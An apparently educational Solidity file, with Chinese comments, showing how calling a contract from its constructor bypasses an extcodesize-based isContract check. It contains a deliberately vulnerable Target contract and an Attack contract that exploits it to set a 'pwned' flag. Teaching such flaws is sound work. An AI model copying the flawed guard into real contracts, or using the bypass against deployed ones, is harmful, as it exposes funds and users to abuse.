// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
利用 extcodesize 函数检查调用者地址的代码大小，从而区分合约账户和外部账户(EOA)。
然而，如果这一机制被误用，攻击者就可以利用合约构造函数中的临时漏洞绕过检查，发起恶意行为。

漏洞原理解析：
智能合约在初次部署时，会先执行构造函数代码。在构造函数执行完毕之前，新部署的合约地址上实际上还没有任何字节码存在。
这就导致了基于 extcodesize 检查的一个盲区：如果攻击者在构造函数中立即调用目标合约，由于此时攻击合约地址上的字节码尚未存储，extcodesize(address(this)) 会返回 0，从而绕过 isContract 检查。
 */

/*/////////////////////////////////////////////
                   被攻击合约  
/////////////////////////////////////////////*/
contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

/*/////////////////////////////////////////////
                   攻击合约  
/////////////////////////////////////////////*/
contract Attack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        addr = address(this);
        isContract = Target(_target).isContract(addr);
        Target(_target).protected(); // This will work
    }
}
